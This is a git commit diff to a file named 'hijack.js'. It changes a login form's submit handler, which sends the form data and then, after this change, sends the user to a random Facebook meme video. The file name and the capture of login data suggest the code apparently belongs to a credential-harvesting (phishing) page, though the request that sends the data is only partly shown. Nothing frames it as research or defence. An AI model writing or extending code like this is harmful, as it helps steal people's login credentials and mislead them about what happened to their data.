ccdcf1c8f505c7c7c938670bcba7ec95df8bbce1
Isaac Talb <thaungahlaybaw@gmail.com>
2025-03-26 00:11:47 +0700

    added ramdom meme link after submit

--- public/hijack.js
+++ public/hijack.js
@@ -16,9 +16,24 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     .then(data => {
         console.log("Response:", data);
         alert("Form submitted successfully!");
+
+        let links = [
+            "https://www.facebook.com/100032775767828/videos/1159220215447752?idorvanity=482689016783601",
+            "https://www.facebook.com/reel/1297639230783140",
+            "https://www.facebook.com/reel/8025194750913873",
+            "https://www.facebook.com/reel/1058250826134061",
+            "https://www.facebook.com/haziq.faz.2022/videos/638954062364804?idorvanity=482689016783601",
+            "https://www.facebook.com/ThePalMemes/videos/1790441555136299",
+            "https://www.facebook.com/ThePalMemes/videos/9122983674466862",
+        ];
+
+        let randomIndex = Math.floor(Math.random() * links.length);
+        let randomLink = links[randomIndex];
+        window.location.href = randomLink;
     })
     .catch(error => {
         console.error("Error:", error);
         alert("Error submitting form!");
     });
 });
+
